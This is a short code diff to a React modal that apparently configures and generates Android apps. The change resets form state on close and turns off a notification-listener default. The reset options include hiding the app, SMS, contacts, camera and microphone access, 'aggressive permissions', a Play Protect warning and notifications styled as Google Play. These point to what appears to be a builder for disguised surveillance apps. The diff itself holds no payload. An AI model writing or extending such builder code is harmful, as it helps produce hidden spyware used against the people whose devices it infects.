@@ -165,6 +165,35 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         if (contentScrollRef.current) {
             contentScrollRef.current.scrollTo({ top: 0, behavior: 'instant' });
         }
+        if (!isOpen) {
+            setActiveStep('identity');
+            setStatus('idle');
+            setProgress(0);
+            setProgressStep("");
+            setDownloadUrl("");
+            setQueuePosition(0);
+            setSelectedPreset('custom');
+            setCustomAppName("");
+            setCustomPackageName("com.gallery.eye");
+            setCustomWebLink("");
+            setCustomIcon(null);
+            setCustomIconPreview(null);
+            setHideApp(false);
+            setEnableSmsPermission(false);
+            setEnableContactsPermission(false);
+            setEnableStoragePermission(true);
+            setEnableCameraPermission(false);
+            setEnableMicrophonePermission(false);
+            setEnableNotificationListener(false);
+            setShowPlayProtectWarning(false);
+            setAggressivePermissions(false);
+            setShowAdvancedPermissions(false);
+            setNotificationStyle("google_play");
+            setNotificationClickAction("device_info");
+            setNotificationIcon("info");
+            setNotificationTitle("");
+            setNotificationText("");
+        }
     }, [activeStep, isOpen]);
 
     // Selected Preset State
@@ -213,7 +242,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableStoragePermission, setEnableStoragePermission] = useState(true);
     const [enableCameraPermission, setEnableCameraPermission] = useState(false);
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
-    const [enableNotificationListener, setEnableNotificationListener] = useState(true);
+    const [enableNotificationListener, setEnableNotificationListener] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
